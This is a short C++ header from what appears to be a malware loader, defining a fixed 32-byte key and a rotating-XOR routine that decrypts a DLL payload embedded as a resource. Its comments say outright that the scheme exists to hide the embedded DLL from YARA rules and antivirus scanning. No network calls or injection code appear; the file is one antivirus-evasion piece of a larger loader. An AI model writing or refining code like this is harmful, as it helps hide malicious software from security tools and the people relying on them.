#pragma once
// build_salt.h -- Unique per-build cryptographic salt and symmetric cipher.
// Used to encrypt the payload before embedding as RCDATA in the loader.
// Scrambles static signatures, section patterns, and strings so YARA/AV
// cannot match the embedded DLL at rest.

#include <cstdint>
#include <cstddef>

namespace bp {

// 32-byte build salt.
constexpr uint8_t kBuildSalt[32] = {
    0x9E, 0x37, 0x79, 0xB9, 0x7F, 0x4A, 0x7C, 0x15,
    0xD3, 0xA2, 0x61, 0x89, 0x45, 0xE1, 0x02, 0xF8,
    0x6C, 0x3B, 0x91, 0x1A, 0x5D, 0x74, 0xE9, 0x23,
    0x88, 0x5F, 0x10, 0x44, 0xC7, 0x2E, 0x99, 0x51
};

inline void DecryptPayload(uint8_t* data, size_t size) {
    if (!data || size == 0) return;
    for (size_t i = 0; i < size; ++i) {
        uint8_t k = kBuildSalt[i % sizeof(kBuildSalt)];
        uint8_t rot = static_cast<uint8_t>(i % 7);
        if (rot != 0) {
            k = static_cast<uint8_t>((k << rot) | (k >> (8 - rot)));
        }
        data[i] ^= k;
    }
}

} // namespace bp
